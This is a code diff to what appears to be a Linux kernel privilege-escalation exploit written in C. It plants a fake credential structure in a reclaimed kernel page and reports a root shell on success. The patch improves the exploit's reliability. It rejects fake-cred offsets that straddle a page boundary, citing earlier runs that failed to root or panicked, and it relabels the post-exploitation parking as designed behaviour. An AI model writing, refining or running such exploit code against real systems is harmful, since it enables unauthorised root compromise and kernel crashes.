@@ -948,10 +948,31 @@ static void finish_run(void)
     }
 }
 
+/*
+ * Stop the run because something failed.  This is an error: the kernel still
+ * holds a stale node and the process must stay parked.
+ */
 static void park_forever(const char *why)
 {
     finish_run();
     logf("[!] %s -- parking without reap (zombie held)\n", why);
+    fflush(stdout);
+    for (;;)
+        pause();
+}
+
+/*
+ * Stop the run on purpose after it succeeded.
+ *
+ * The fake endgame must keep the reclaimed page mapped, so the process parks
+ * with its socket buffers holding the fake cred.  That is the designed
+ * behaviour, not a failure -- logging it with `[!]` made a successful root
+ * look like an error.  `[*]` is the app's warning tone.
+ */
+static void park_expected(const char *why)
+{
+    finish_run();
+    logf("[*] %s -- parking as designed (fake cred page held)\n", why);
     fflush(stdout);
     for (;;)
         pause();
@@ -1414,6 +1435,28 @@ static void run_plant(unsigned long long target, int tag, int mode,
             if (off + CRED_REQ > 0x2000)
             {
                 logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
+                     tag, off);
+                trace_stop();
+                kill(T, SIGKILL);
+                waitpid(T, NULL, 0);
+                free(payload);
+                close_timer_go();
+                res->retry = 1;
+                return;
+            }
+            /*
+             * The cred must not straddle a 4 KiB page inside the order-1 block.
+             *
+             * `off` is (V & 0x1fff) + 0x78, so a node in the last 0x40 bytes of
+             * a page puts euid/egid/fsuid/fsgid in the *next* page.  All three
+             * recorded runs with off=0xff0 failed to root (uid=2000/2000,
+             * 0/-118) and one of them panicked.  Drawing another victim is
+             * free here -- this is decided before the arm/reap, so no node has
+             * been created yet.
+             */
+            if ((off & 0xfff) + CRED_REQ > 0x1000)
+            {
+                logf("[-] plant%d fake cred straddles a page off=%#zx; retryable\n",
                      tag, off);
                 trace_stop();
                 kill(T, SIGKILL);
@@ -2609,9 +2652,9 @@ int main(int argc, char **argv)
         }
     }
     if (g_fake_stage)
-        park_forever("fake cred page held; reboot to clean");
+        park_expected("fake cred page held; reboot to clean");
     if (g_held)
-        park_forever("root shell finished; failed-plant zombies are held");
+        park_expected("root shell finished; failed-plant zombies are held");
     finish_run();
     logf("[+] done\n");
     return 0;
